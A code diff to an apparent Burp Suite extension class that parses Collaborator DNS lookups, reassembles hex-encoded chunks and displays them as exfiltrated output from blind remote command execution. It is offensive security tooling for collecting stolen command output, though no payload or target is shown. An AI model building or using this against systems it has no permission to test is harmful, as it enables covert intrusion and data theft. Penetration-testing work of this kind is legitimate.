@@ -8,6 +8,7 @@ import com.google.common.io.BaseEncoding;
 
 import javax.swing.*;
 import java.util.*;
+import java.util.stream.Collectors;
 
 public class RCEMonitoringManager {
     private final CollaboratorClient collaboratorClient;
@@ -46,30 +47,54 @@ public class RCEMonitoringManager {
                             continue;
                         }
                         
+                        logging.logToOutput("Raw DNS query: " + interaction.dnsDetails().get().query());
+                        
                         byte[] queryBytes = interaction.dnsDetails().get().query().getBytes();
                         logging.logToOutput("Processing query with length: " + queryBytes.length);
                         
-                        if (queryBytes.length < 19) {
+                        int currentIndex = 12;
+                        if (currentIndex >= queryBytes.length) {
+                            continue;
+                        }
+
+                        StringBuilder preamble = new StringBuilder();
+                        int preambleLength = queryBytes[currentIndex] & 0xFF;
+                        currentIndex++;
+                        
+                        if (currentIndex + preambleLength > queryBytes.length) {
                             continue;
                         }
                         
-                        int preambleOffset = queryBytes[12] & 0xFF;
-                        int dataChunkOffset = queryBytes[17] & 0xFF;
-                        
-                        StringBuilder preamble = new StringBuilder();
-                        for (int i = 13; i < 13 + preambleOffset; i++) {
-                            preamble.append((char)queryBytes[i]);
+                        for (int i = 0; i < preambleLength; i++) {
+                            preamble.append((char)queryBytes[currentIndex + i]);
+                        }
+                        currentIndex += preambleLength;
+
+                        StringBuilder dataChunk = new StringBuilder();
+                        if (currentIndex >= queryBytes.length) {
+                            continue;
                         }
                         
-                        StringBuilder dataChunk = new StringBuilder();
-                        for (int i = 18; i < 18 + dataChunkOffset; i++) {
-                            dataChunk.append((char)queryBytes[i]);
+                        int dataLength = queryBytes[currentIndex] & 0xFF;
+                        currentIndex++;
+                        
+                        if (currentIndex + dataLength > queryBytes.length) {
+                            continue;
+                        }
+                        
+                        for (int i = 0; i < dataLength; i++) {
+                            dataChunk.append((char)queryBytes[currentIndex + i]);
                         }
                         
                         logging.logToOutput(String.format("Extracted - Preamble: %s, Data: %s", 
                             preamble.toString(), dataChunk.toString()));
                         
-                        dnsRecordDict.put(preamble.toString(), dataChunk.toString());
+                        String cleanPreamble = preamble.toString().trim();
+                        String cleanData = dataChunk.toString().trim();
+                        
+                        if (!cleanPreamble.isEmpty() && !cleanData.isEmpty()) {
+                            dnsRecordDict.put(cleanPreamble, cleanData);
+                        }
                     }
                     
                     Set<String> newKeys = dnsRecordDict.keySet();
@@ -122,18 +147,32 @@ public class RCEMonitoringManager {
     private void displayOutput(Map<String, String> dnsRecordDict, String collaboratorPayload) {
         StringBuilder output = new StringBuilder();
         
-        List<Map.Entry<String, String>> sortedEntries = new ArrayList<>(dnsRecordDict.entrySet());
-        Collections.sort(sortedEntries, Map.Entry.comparingByKey());
+        // Filter and sort only numeric keys
+        List<Map.Entry<String, String>> sortedEntries = dnsRecordDict.entrySet().stream()
+            .filter(entry -> entry.getKey().matches("\\d+"))
+            .sorted((a, b) -> Integer.parseInt(a.getKey()) - Integer.parseInt(b.getKey()))
+            .collect(Collectors.toList());
         
+        // Clean and concatenate hex data
         for (Map.Entry<String, String> entry : sortedEntries) {
-            output.append(entry.getValue());
+            String hexValue = entry.getValue()
+                .replaceAll("[^0-9A-Fa-f]", "") // Remove non-hex characters
+                .replaceAll("k.*$", "") // Remove any trailing non-hex data
+                .trim();
+            if (!hexValue.isEmpty()) {
+                output.append(hexValue);
+            }
         }
         
         try {
-            String result = new String(BaseEncoding.base16().decode(output.toString().toUpperCase()));
+            String hexString = output.toString();
+            logging.logToOutput("Attempting to decode hex string: " + hexString);
+            
+            byte[] decoded = BaseEncoding.base16().decode(hexString.toUpperCase());
+            String result = new String(decoded);
+            
             rcePanel.getRceOutputTxt().append("Command: " + rcePanel.getCommandTxt().getText() + "\n");
             rcePanel.getRceOutputTxt().append("Exfiltrated Data:\n" + result + "\n\n");
-            
             rcePanel.getRceOutputTxt().setCaretPosition(rcePanel.getRceOutputTxt().getDocument().getLength());
             
             logging.logToOutput("Collaborator Domain: " + collaboratorPayload);
@@ -142,6 +181,10 @@ public class RCEMonitoringManager {
             
         } catch (IllegalArgumentException e) {
             logging.logToError("Error decoding hex output: " + e.getMessage());
+            logging.logToError("Problematic hex string: " + output.toString());
+            SwingUtilities.invokeLater(() -> {
+                rcePanel.getRceOutputTxt().append("Error: Failed to decode output. See extension logs for details.\n");
+            });
         }
     }
 }
